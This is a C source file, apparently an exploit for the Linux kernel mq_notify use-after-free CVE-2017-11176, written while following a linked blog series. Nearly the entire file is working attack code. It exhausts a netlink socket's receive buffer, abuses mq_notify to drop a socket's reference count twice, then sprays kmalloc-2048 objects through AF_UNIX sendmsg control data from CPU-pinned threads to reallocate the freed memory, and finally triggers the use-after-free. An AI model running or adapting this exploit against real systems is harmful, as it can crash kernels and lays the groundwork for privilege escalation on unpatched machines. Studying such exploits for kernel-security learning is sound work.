
// https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.htm

/* TO DO

1 -> socket family: AF_UNIX
2 -> block indefinitely {call setsockopt() with the SO_SNDTIMEO option, and giving it a struct timeval filled with zero. It will set the timeout to MAX_SCHEDULE_TIMEOUT}

3 -> msg->msg_control
        -first 8 bytes is the size of reallocation buffer (2048)
        -second field(4 bytes) is smth other than SOL_SOCKET which equals 1
        -last 4 bytes are free for use
*/
//gcc -lrt -pthread exploit.c -o exploit

#define _GNU_SOURCE
#include <sys/syscall.h>
#include <unistd.h>
#include <mqueue.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <asm/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <errno.h>
#include <sched.h>
#include <string.h>
#include <sys/un.h>

#define KMALLOC_TARGET 2048
#define NUM_THREADS 10
static volatile char global_realloc_data[KMALLOC_TARGET];
static volatile size_t global_created_threads = 0;
static volatile size_t global_start_realloc = 0;

#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(socket, level, option_name, option_value, option_len) syscall(__NR_setsockopt, socket, level, option_name, option_value, option_len)
#define _close(fd) syscall(__NR_close, fd)              
#define _dup(oldfd) syscall(__NR_dup, oldfd)  
#define _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)
#define _sendmsg(socket, message, flags) syscall(__NR_sendmsg, socket, message, flags)
#define _getsockopt(socket, level, option_name, option_value, option_len) syscall(__NR_getsockopt, socket, level, option_name, option_value, option_len)
#define _sched_setaffinity(pid, cpusetsize, mask) syscall(__NR_sched_setaffinity, pid, cpusetsize, mask)
#define _getpid() syscall(__NR_getpid)
#define _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)
#define _connect(sockfd, addr, addrlen) syscall(__NR_connect, sockfd, addr, addrlen)
#define _gettid() syscall(__NR_gettid)
#define _sched_yield() syscall(__NR_sched_yield)

struct thread_data
{
    int blockFD;
    int sockFD;
};

struct realloc_thread_data
{
    pthread_t tid;
    int sendFD;
    int recieveFD;
    struct sockaddr_un address;
};

void* unblock(void *threadVar)
{
    sleep(5);
    struct thread_data* my_data = (struct thread_data*) threadVar;
    int blockFD = my_data->blockFD;
    int sockFD = my_data->sockFD;
    if(_close(sockFD) != 0)
    {
        perror("close");
    }
    printf("[unblock] closed fd %d\n", sockFD);

    int val = 55;
    printf("[unblock] about to unblock\n");
    if(_setsockopt(blockFD, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
        perror("setsockopt");
}

//to statisfy the condition: (sk_rmem_alloc > sk_rcvbuf)
int fill_receive_buffer()
{
    int sendFD, receiveFD;

    if ((sendFD = _socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK)) < 0)
    {
        perror("socket");
        return -1;
    }
    if ((receiveFD = _socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK)) < 0)
    {
        perror("socket");
        return -1;
    }

    int sendbuffSize;
    socklen_t optlen = sizeof(sendbuffSize);
    if( _getsockopt(sendFD, SOL_SOCKET, SO_SNDBUF, &sendbuffSize, &optlen))
    {
        perror("getsockopt");
        return -1;
    }
    //printf("%d\n", sendbuffSize); // 212992 or using System Tap : 212992
    char buffer[sendbuffSize - 32];
    
    struct sockaddr_nl sockAddress = {
        .nl_family = AF_NETLINK,
        .nl_pad = 0,
        .nl_pid = 144,
        .nl_groups = 0
    };
    struct iovec iov = {
    .iov_base = buffer,
    .iov_len = sizeof(buffer)
    };
    struct msghdr messageHeader = {
    .msg_name = &sockAddress,
    .msg_namelen = sizeof(sockAddress),
    .msg_iov = &iov,
    .msg_iovlen = 1,
    .msg_control = NULL,
    .msg_controllen = 0,
    .msg_flags = 0, 
    };

    while(_bind(receiveFD, (struct sockaddr *)&sockAddress, sizeof(sockAddress)))
    {
        if(errno == EADDRINUSE)
        {
            sockAddress.nl_pid ++;
        }else{
            perror("bind");
            return -1;
        }
    }
    while(_sendmsg(sendFD, &messageHeader, MSG_DONTWAIT) > 0);
    if(errno != EAGAIN)
    {
        perror("sendmsg");
        return -1;
    }
    if(_close(sendFD) != 0)
    {
        perror("close");
        return -1;
    }

    printf("[main] filled the receiver buffer :: condition (sk_rmem_alloc > sk_rcvbuf)\n");

    return receiveFD;
}

int decrease_refCount(int sockFD, int blockFD)
{
    struct sigevent sevp;
    char* buf;
    buf = (char *)malloc(32*sizeof(char));
   //int sockFD;
   /* int sockFD = _socket(AF_NETLINK, SOCK_RAW ,NETLINK_GENERIC);
    if(sockFD < 0)
    {
        perror("socket");
        return -1;
    }*/

    struct thread_data th_data;
    th_data.sockFD = sockFD;
    th_data.blockFD = blockFD;
    
    pthread_t thread;
    if(pthread_create(&thread, NULL, &unblock, (void *) &th_data))
    {
        perror("pthread_create");
        return -1;
    }
    printf("[main] created unblock thread\n");

    sevp.sigev_notify = SIGEV_THREAD;
    sevp.sigev_value.sival_ptr = buf;
    sevp.sigev_signo = sockFD;

    mqd_t mqdes = (mqd_t) -1; // ??
    
   // printf("%p\n", &sevp);
    printf("[main] about to get blocked\n");
    //  On success mq_notify() returns 0; on error, -1 is returned, with errno set to indicate the error.
    if(_mq_notify(mqdes, &sevp)== -1 || errno != EBADF )
    {
        printf("[main] mq_notify succeed\n");
        return 0;
    }
    else
    {
        perror("mq_notify SysCall");
        printf("call failed\n");
        return -1;
    }
    return 0;
}

static int migrate_to_cpu0(void)
{
    cpu_set_t set;

    CPU_ZERO(&set);           //clears set so that it contains no CPUs
    CPU_SET(0, &set);         //add CPU 0 to set

    if(_sched_setaffinity(_getpid(), sizeof(set), &set) == -1)
    {
        perror("[-] sched_setaffinity");
        return -1;
    }
    return 0;
}

static int init_realloc_thread_data(struct realloc_thread_data* data)
{
    static int count = 0;
    if(((data->sendFD = _socket(AF_UNIX, SOCK_DGRAM, 0)) < 0) || ((data->recieveFD = _socket(AF_UNIX, SOCK_DGRAM, 0)) < 0))
    {
        perror("[-] socket");
        return -1;
    }
    memset(&data->address, 0, sizeof(data->address));
    data->address.sun_family = AF_UNIX;
    sprintf(data->address.sun_path + 1,"sock_%lx_%d" ,_gettid(), ++count );
    if(_bind(data->recieveFD, (struct sockaddr*)&data->address, sizeof(data->address)))
    {
        perror("[-] bind");
        return -1;

    }
    if(_connect(data->sendFD,(struct sockaddr*)&data->address, sizeof(data->address)))
    {
        perror("[-] connect");
        return -1;
    }
    struct timeval timeVal;
    memset(&timeVal, 0, sizeof(timeVal));
    if(_setsockopt(data->recieveFD, SOL_SOCKET, SO_SNDTIMEO, &timeVal, sizeof(timeVal) ))
    {
        perror("[-] setsockopt");
        return -1;
    }
    return 0;

}

static void* reallocate(void *threadVar)
{
    struct realloc_thread_data * myData = (struct realloc_thread_data *) threadVar;
    char buffer[200];
    struct msghdr messageHeader;
    struct iovec iov = {
        .iov_base = buffer,
        .iov_len = sizeof(buffer)
    };
    memset(&messageHeader, 0, sizeof(messageHeader));
    messageHeader.msg_iov = &iov;
    messageHeader.msg_iovlen =  1;

    if(migrate_to_cpu0()) 
        printf("[realloc] coundnt migrate to cpu0\n");

    while(_sendmsg(myData->sendFD, &messageHeader, MSG_DONTWAIT) > 0);

    if(errno != EAGAIN)
    {
        perror("[-] realloc sendmsg 1");
    }

    iov.iov_len = 16;
    messageHeader.msg_control = (void *) global_realloc_data;
    messageHeader.msg_controllen = sizeof(global_realloc_data);

    global_created_threads ++;

    while(!global_start_realloc);

    if(_sendmsg(myData->sendFD, &messageHeader, 0) < 0)
    {
        perror("[-] realloc sendmsg 2");
    }
}

static inline void realloc_NOW(void)
{
    global_start_realloc = 1;
    _sched_yield();
    sleep(5);
}

static int create_realloc_threads(struct realloc_thread_data* data)
{
    /* TO DO 3 */
    memset((void*)global_realloc_data, 0, sizeof(global_realloc_data));
    struct cmsghdr *firstHeader = (struct cmsghdr*) global_realloc_data;
    firstHeader->cmsg_len = KMALLOC_TARGET;
    printf("[reallocation] initialized control data\n");

    int i;
    for(i = 0 ; i < NUM_THREADS; i++)
    {
        if(init_realloc_thread_data(&data[i]))
        {
            printf("[-] couldn't initialize realloc thread %d data\n", i);
            return -1;
        }
            
        
        if(pthread_create(&data[i].tid, NULL, &reallocate, &data[i]))
        {
            printf("[-] couldn't create realloc thread %d\n", i);      
            return -1;
        }
    }

    while( global_created_threads < NUM_THREADS)
        _sched_yield(); 

    printf("[reallocation] %d Realloc Threads are Ready\n", i);
    return 0;
}

int main()
{
    int sockFD;
    int sockFD2;
    int blockFD;

    struct realloc_thread_data data[NUM_THREADS];

    if(migrate_to_cpu0())
    {
        printf("[-] failed to migrate to CPU0\n");
        return -1;
    }
    printf("[main] migrated to cpu 0\n");

    memset(data, 0, sizeof(data));
    if(create_realloc_threads(data))
    {
        printf("[-] failed to create allocation threads\n");
    }
    if((sockFD = fill_receive_buffer()) == -1)
    {
        perror("fill receive buffer");
        return -1;
    }

    if(((blockFD = _dup(sockFD)) < 0) || ((sockFD2 = _dup(sockFD)) < 0) )
    {
        perror("dup");
        return -1;
    }

    if(decrease_refCount(sockFD, blockFD) || decrease_refCount(sockFD2, blockFD))
    {
        return -1;
    }

    realloc_NOW();

    printf("[main] ready to crash?\n");
    do { 
        printf("[main] press key to continue...\n"); 
        getchar();
        _close(blockFD); 
    } while(0);

    return 0;


}